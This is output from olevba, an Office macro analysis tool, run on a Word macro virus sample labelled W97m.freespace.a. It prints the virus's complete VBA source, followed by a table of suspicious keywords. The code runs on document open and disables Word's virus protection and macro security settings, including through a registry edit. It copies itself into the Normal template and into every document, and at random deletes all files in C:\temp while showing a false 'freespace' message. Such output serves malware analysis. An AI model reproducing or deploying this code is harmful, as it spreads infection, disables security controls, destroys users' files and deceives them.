olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Onex.f-e65695e19d9e371b6eeeb38e5c7e133d3b2754a5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Lisa.cls 
in file: Virus.MSWord.Onex.f-e65695e19d9e371b6eeeb38e5c7e133d3b2754a5 - OLE stream: 'Macros/VBA/Lisa'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'W97m.freespace.a by SEMTEX
Private Sub Document_Open()
 On Error Resume Next
 Set Code = New DataObject
 Options.ConfirmConversions = 0
 Options.SaveNormalPrompt = 0
 Options.VirusProtection = 0
 
 With Application
 .StatusBar = "READY"
 End With

  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
     CommandBars("Macro").Controls("Security...").Enabled = 0
     System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  End If
 CommandBars("Tools").Controls("Macro").Enabled = 0
  If NormalTemplate.VBProject.VBComponents(1).Name = "Lisa" Then
    callitn = True
   Else
    Set A = NormalTemplate.VBProject.VBComponents(1)
  End If
  If ActiveDocument.VBProject.VBComponents(1).Name = "Lisa" Then
    callita = True
   Else
    Set A = ActiveDocument.VBProject.VBComponents(1)
    saveit = True
  End If
  Set ab = A.CodeModule
   Code.SetText Lisa.VBProject.VBComponents(1).CodeModule.Lines(1, Lisa.VBProject.VBComponents(1).CodeModule.CountOfLines)
   ab.DeleteLines 1, ab.CountOfLines
   ab.InsertLines 1, Code.GetText
   A.Name = "Lisa"
   If callitn = True And callita = True Then
    If Int(Rnd * 5) = 2 Then
      Call Lisa_payload
    End If
   End If
  If saveit = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Private Sub Lisa_payload()
On Error Resume Next

DoEvents
Randomize
If Int(Rnd * 500) = 2 Then

 Kill "C:\\temp\*.*"

 Assistant.Visible = True
With Assistant.NewBalloon
    .Button = msoButtonSetOK
    .Heading = "READY"
    .Text = "Windows has just deleted any unwanted files to create freespace"
    .Show
End With
 
End If

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

